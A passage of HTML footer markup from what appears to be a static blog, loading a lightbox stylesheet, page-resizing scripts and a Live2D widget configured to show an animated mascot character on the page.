href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body></html>